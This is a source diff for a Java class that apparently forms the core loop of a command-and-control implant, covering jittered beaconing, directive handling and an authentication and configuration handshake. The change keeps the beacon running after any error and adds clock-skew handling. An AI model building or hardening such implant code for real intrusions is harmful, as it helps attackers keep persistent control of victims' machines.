@@ -11,30 +11,35 @@ import java.util.concurrent.TimeUnit;
 public class Core {
 	static public int noAct = 0;
 	public static void handle(Hashtable keepAlive) throws ClassNotFoundException, NoSuchMethodException, SecurityException, IllegalAccessException, IllegalArgumentException, InvocationTargetException, InterruptedException, NoSuchAlgorithmException {
-		if (Integer.parseInt(keepAlive.get("directives").toString()) > 0) {
-			Proc.ingest();
-			noAct = 0;
-		} else {
-			int jitterActual = Util.numrand((int) Main.config.get("jitterMin"), (int) Main.config.get("jitterMax"));
-			if (Main.session == 1) {
-				TimeUnit.MILLISECONDS.sleep(jitterActual);
+		try {
+			if (Integer.parseInt(keepAlive.get("directives").toString()) > 0) {
+				Proc.ingest();
+				noAct = 0;
 			} else {
-				if (noAct < 500) {
-					TimeUnit.MILLISECONDS.sleep((noAct*(noAct/2)+jitterActual));
+				int jitterActual = Util.numrand((int) Main.config.get("jitterMin"), (int) Main.config.get("jitterMax"));
+				if (Main.session == 1) {
+					TimeUnit.MILLISECONDS.sleep(jitterActual);
 				} else {
-					noAct = 0;
-				}
+					if (noAct < 500) {
+						TimeUnit.MILLISECONDS.sleep((noAct*(noAct/2)+jitterActual));
+					} else {
+						noAct = 0;
+					}
 				
-				noAct += 1;
+					noAct += 1;
+				}
 			}
+			beacon();
+		} catch (Exception q) {
+			beacon();
 		}
-		beacon();
 	}
 	
 	public static Hashtable setup() throws ClassNotFoundException, NoSuchMethodException, SecurityException, IllegalAccessException, IllegalArgumentException, InvocationTargetException, NoSuchAlgorithmException {
 		Hashtable finalConf = new Hashtable();
 		Hashtable authResult = Netw.send("Auth",null,null,null);
 		Main.config.put("lysessid",authResult.get("cookieDough"));
+                Main.skew = (Util.skewer(authResult.get("refStamp").toString()));
 		finalConf = Netw.send("Conf",null,authResult.get("key").toString(),Crypt.bake());
 		return finalConf;
 	}
